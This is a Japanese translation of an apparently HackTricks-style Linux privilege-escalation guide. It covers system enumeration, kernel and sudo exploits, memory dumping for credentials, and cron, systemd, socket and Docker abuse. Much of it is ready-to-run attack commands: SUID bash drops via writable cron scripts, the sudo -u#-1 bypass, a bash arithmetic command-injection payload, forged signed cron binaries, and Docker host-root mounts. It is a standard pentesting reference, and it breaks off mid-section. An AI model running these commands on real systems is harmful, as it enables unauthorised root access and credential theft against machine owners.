# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

稼働しているOSの情報を取得しましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

もし **`PATH`変数内の任意のフォルダに書き込み権限がある** 場合、いくつかの libraries や binaries をハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に、興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、権限昇格に使える exploit があるかどうか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルのリストや、いくつかの既存の **compiled exploits** は以下で見つかります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
その他 **compiled exploits** を見つけられるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploitsを検索するのに役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim上で実行、kernel 2.x用のexploitのみチェック)

常に **Googleでkernelバージョンを検索** してください。あなたのkernelバージョンが既存のkernel exploitに記載されていることがあり、その場合そのexploitが有効であると確認できます。

追加のkernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

以下に示される脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って、sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo のバージョン 1.9.17p1 より前（**1.9.14 - 1.9.17 < 1.9.17p1**）では、ユーザーが制御するディレクトリから `/etc/nsswitch.conf` ファイルが使用される場合、sudo `--chroot` オプションを介して権限のないローカルユーザーが root に権限昇格できる問題があります。

この脆弱性を悪用するための [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) と [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) があります。実行する前に、`sudo` のバージョンが脆弱であり `chroot` 機能をサポートしていることを確認してください。

詳細は元の [脆弱性アドバイザリ](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) を参照してください。

#### sudo < v1.8.28

出典: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 署名検証に失敗しました

この vuln がどのように悪用され得るかの**例**は**smasher2 box of HTB**を確認してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 可能な防御策の列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker コンテナ内にいる場合、そこから脱出を試みることができます。

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

**何がマウントされていて何がアンマウントされているか**、どこで、なぜかを確認してください。何かがアンマウントされている場合は、それをマウントして機密情報がないか確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**任意のコンパイラがインストールされているか**確認してください。kernel exploit を使用する必要がある場合、実際に使うマシン（またはそれに近いマシン）でコンパイルすることが推奨されるため、これは有用です。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストールされているパッケージやサービスのバージョン**を確認してください。例えば古い Nagios バージョンが存在し、that could be exploited for escalating privileges…\
より疑わしいインストール済みソフトウェアのバージョンは手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
もしマシンにSSHでアクセスできるなら、インストールされている古い脆弱なソフトウェアを確認するために**openVAS**を使うこともできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くはほとんど役に立たないことに注意してください。したがって、インストールされているソフトウェアのバージョンが既知のエクスプロイトに対して脆弱かどうかをチェックする OpenVAS 等のアプリケーションを使うことを推奨します_

## Processes

どの**プロセス**が実行されているかを確認し、どのプロセスが**本来より多くの権限**を持っていないかをチェックしてください（例えば tomcat が root によって実行されているかどうかなど）。
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running — 権限昇格に悪用できる可能性があります](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
また、**プロセスのバイナリに対する権限を確認**してください。上書きできるかもしれません。

### プロセス監視

プロセスを監視するために [**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用できます。これは、脆弱なプロセスが頻繁に実行されている場合や、特定の条件が満たされたときにそれらを特定するのに非常に役立ちます。

### プロセスメモリ

サーバの一部サービスは、**credentials in clear text inside the memory** を保存することがあります。\
通常、他ユーザに属するプロセスのメモリを読むには **root privileges** が必要なため、これは通常既に root でありさらに資格情報を発見したい場合により有用です。\
ただし、**通常ユーザーとしては自分が所有するプロセスのメモリを読むことができる**点は覚えておいてください。

> [!WARNING]
> 最近のマシンの多くでは **ptrace をデフォルトで許可していません**。つまり、権限のないユーザに属する他のプロセスをダンプできないことが多い点に注意してください。
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であればすべてのプロセスをデバッグできます。これは ptrace の古典的な動作です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみデバッグ可能です。
> - **kernel.yama.ptrace_scope = 2**: 管理者のみが ptrace を使用できます（CAP_SYS_PTRACE が必要）。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、ptrace を再度有効にするには再起動が必要です。

#### GDB

FTP サービス（例）のメモリにアクセスできる場合、Heap を取得してその中の credentials を検索できます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDに対し、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示します**; また、各マッピング領域の**アクセス権**も表示します。 その **mem** 擬似ファイルは**プロセスのメモリ本体を露出します**。**maps** ファイルから、どのメモリ領域が**読み取り可能か**とそのオフセットが分かります。この情報を使って**mem ファイルをシークし、読み取り可能な領域をすべてダンプします**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの**物理**メモリにアクセスするためのインターフェースで、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、Windows向けのSysinternalsスイートにあるクラシックなProcDumpツールをLinux向けに再構想したものです。入手先は [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_手動でroot要件を削除し、あなたが所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要です)

### プロセスメモリからの資格情報

#### 手動の例

authenticator プロセスが実行されている場合:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスを dump the process して（前のセクションを参照して、プロセスのメモリを dump the memory of a process するさまざまな方法を確認してください）、メモリ内の credentials を検索できます：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

このツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は **steal clear text credentials from memory** およびいくつかの **well known files** から情報を抜き取ります。正しく動作させるには root privileges が必要です。

| 機能                                           | プロセス名         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron ジョブ

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.

Typical chain
- loopbackのみで公開されているポートを発見（例: 127.0.0.1:8000）および Basic-Auth リームを `ss -ntlp` / `curl -v localhost:8000` で確認
- 運用アーティファクトから資格情報を見つける:
- Backups/scripts with `zip -P <password>`
- systemd ユニットが `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開している
- トンネルを張ってログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して即実行する (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Crontab UI を root で実行しない; 専用ユーザーと最小権限で制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する; パスワードを再利用しない
- unit ファイルにシークレットを埋め込まない; secret stores または root のみが読める EnvironmentFile を使用する
- on-demand ジョブ実行に対して audit/logging を有効にする

スケジュールされたジョブに脆弱性がないか確認する。root によって実行されるスクリプトを悪用できるかもしれない（wildcard vuln? root が使用するファイルを改変できるか? symlinks を使う? root が使用するディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_/etc/crontab_ の中に次の PATH を見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_「user」ユーザーが /home/user に書き込み権限を持っている点に注意してください_)

この crontab 内で root が PATH を設定せずにコマンドやスクリプトを実行しようとすると、例えば: _\* \* \* \* root overwrite.sh_\  
その場合、次のようにして root shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron が wildcard を含むスクリプトを使用している場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを悪用して予期しないこと（例えば privesc）を引き起こす可能性があります。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**wildcardがパスの前にある場合** _**/some/path/\***_ **、脆弱ではありません（** _**./\***_ **も脆弱ではありません）。**

詳細な wildcard exploitation トリックについては、以下のページを参照してください：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: Bash では展開は次の順序で行われます: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. したがって `$(/bin/bash -c 'id > /tmp/pwn')0` のような値はまず置換され（コマンドが実行され）、残った数値の `0` が算術に使われるためスクリプトはエラーなく続行されます。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: パースされるログに attacker-controlled なテキストを書き込み、数値に見えるフィールドが command substitution を含み末尾が数字になるようにします。コマンドは stdout に出力しない（またはリダイレクトする）ようにして、算術が有効なままになるようにしてください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root によって実行される **can modify a cron script** を変更できるなら、非常に簡単に shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
もし root によって実行される script が **directory where you have full access** を使用しているなら、その folder を削除して、あなたが管理する script を提供する別の場所への **symlink folder を作成する** のが有効かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue team が cron 駆動のバイナリを「署名」して、カスタム ELF セクションをダンプしベンダー文字列を grep してから root として実行することがあります。もしそのバイナリが group-writable（例: `/opt/AV/periodic-checks/monitor` が `root:devs 770`）で、署名素材を leak できれば、セクションを偽造して cron タスクをハイジャックできます。

1. `pspy` を使って検証フローをキャプチャします。Era では、root が `objcopy --dump-section .text_sig=text_sig_section.bin monitor` を実行し、その後 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` を実行してからファイルを実行していました。
2. leak したキー/設定（`signing.zip` 内）を使って期待される証明書を再生成します:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 悪意ある置換バイナリ（例: SUID bash を落とす、SSH キーを追加する）を作成し、grep が通るように証明書を `.text_sig` に埋め込みます:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 実行ビットを維持してスケジュールされたバイナリを上書きします:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 次の cron 実行を待ちます。単純な署名チェックが通ると、あなたのペイロードが root として実行されます。

### Frequent cron jobs

プロセスを監視して、1分、2分、5分ごとに実行されているプロセスを探すことができます。これを利用して権限昇格できるかもしれません。

例えば、**1分間 0.1s ごとに監視し**、**実行回数の少ないコマンド順にソートし**、最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**また使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは起動するすべてのプロセスを監視して一覧表示します).

### 見えない cron jobs

コメントの後に**キャリッジリターンを置く**（改行文字なしで）ことでcronjobを作成でき、cron jobは動作します。例（キャリッジリターン文字に注意）:
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。書き込み可能であれば、それを**変更する**ことで、サービスが**開始**、**再起動**、または**停止**されたときにあなたの**バックドアを実行**させることができます（場合によってはマシンの再起動を待つ必要があります）。\
例えば `.service` ファイル内に **`ExecStart=/tmp/script.sh`** としてバックドアを作成します。

### 書き込み可能なサービスバイナリ

**サービスによって実行されるバイナリに対する書き込み権限がある**場合、それらをバックドアに置き換えることができ、サービスが再実行されたときにバックドアが実行されます。

### systemd PATH - 相対パス

以下のコマンドで **systemd** が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内のいずれかのフォルダに**write**できることが判明した場合、**escalate privileges**できる可能性があります。次のような**relative paths being used on service configurations**が使われているファイルを探す必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd PATH フォルダ内に、相対パスのバイナリと同じ名前の **executable** を作成します。サービスが脆弱なアクション（**Start**, **Stop**, **Reload**）の実行を求められると、あなたの **backdoor** が実行されます（通常、非特権ユーザはサービスを start/stop できませんが、`sudo -l` が使えるか確認してください）。

**サービスの詳細は `man systemd.service` を参照してください。**

## **Timers**

**Timers** は名前が `**.timer**` で終わる systemd unit ファイルで、`**.service**` ファイルやイベントを制御します。**Timers** はカレンダー時間イベントや単調時間イベントをネイティブにサポートし、非同期で実行できるため、cron の代替として利用できます。

すべての timers は次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能なタイマー

タイマーを変更できれば、systemd.unit（例えば `.service` や `.target`）のいくつかの既存ユニットを実行させることができます。
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> このタイマーが期限切れになったときにアクティブ化される Unit です。引数は、サフィックスが ".timer" ではない unit 名です。指定しない場合、この値はサフィックスを除いて timer unit と同じ名前の .service にデフォルトされます（上記参照）。アクティブ化される unit 名と timer unit の unit 名は、サフィックス以外は同一にすることが推奨されます。

Therefore, to abuse this permission you would need to:

- systemd unit（例えば `.service`）で、**書き込み可能なバイナリを実行している**ものを見つける
- **相対パスを実行している** systemd unit を見つけ、かつ **systemd PATH** に対して **書き込み権限** を持っている（その実行ファイルを偽装するため）

**Learn more about timers with `man systemd.timer`.**

### **タイマーを有効化する**

タイマーを有効化するには root 権限が必要で、以下を実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**悪用の例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

一部に **sockets listening for HTTP** requests が存在する可能性があることに注意してください（_ここで言っているのは .socket files ではなく、unix sockets として動作するファイルです_）。次のコマンドで確認できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
もしソケットが **HTTP リクエストに応答する** なら、それと **通信** でき、場合によっては **脆弱性を悪用できる** かもしれません。

### 書き込み可能な Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

Docker ソケットへの書き込み権がある場合、次のコマンドを使用して権限を昇格できます:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対してrootレベルのアクセス権を持つcontainerを実行できるようにします。

#### **Docker APIを直接使用する**

Docker CLIが利用できない場合でも、Docker socketはDocker APIと`curl`コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なimagesの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストシステムのルートディレクトリをマウントするcontainerを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したcontainerを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat`を使ってcontainerへの接続を確立し、内部でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat`接続を設定した後は、ホストのファイルシステムに対してroot権限でcontainer内から直接コマンドを実行できます。

### その他

docker socketに対して書き込み権限があり、**group `docker` のメンバー**である場合は[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)があります。もし[**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising) なら、そちらも侵害できる可能性があります。

以下で、dockerからの脱出や悪用による権限昇格の他の方法を確認してください:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 権限昇格

もし**`ctr`**コマンドを使用できることが分かった場合、次のページを読んでください。**権限昇格に悪用できる可能性があります**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 権限昇格

もし**`runc`**コマンドを使用できることが分かった場合、次のページを読んでください。**権限昇格に悪用できる可能性があります**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Busは高度なプロセス間通信（inter-Process Communication, IPC）システムで、アプリケーション間の効率的な相互作用とデータ共有を可能にします。現代のLinuxシステム向けに設計されており、さまざまな形態のアプリケーション通信のための堅牢なフレームワークを提供します。

このシステムは柔軟で、プロセス間のデータ交換を強化する基本的なIPC（拡張されたUNIXドメインソケットに類似）をサポートします。さらに、イベントやシグナルのブロードキャストを助け、システムコンポーネント間のシームレスな統合を促進します。例えば、Bluetoothデーモンからの着信通知が音楽プレーヤーをミュートさせるといった動作が可能です。加えて、D-Busはリモートオブジェクトシステムをサポートしており、サービス要求やメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。

D-Busは許可/拒否モデル（allow/deny model）で動作し、ポリシー規則のマッチングの累積効果に基づいてメッセージ（メソッド呼び出し、シグナル送信など）の権限を管理します。これらのポリシーはバスとのやり取りを指定しており、権限の誤設定を悪用することで権限昇格につながる可能性があります。

例として、`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーを示します。ここではrootユーザーが `fi.w1.wpa_supplicant1` を所有し、そのメッセージの送受信が許可される権限が記述されています。

ユーザーやグループが指定されていないポリシーは全体に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus 通信を enumerate して exploit する方法を学ぶ:**


{{#ref}}
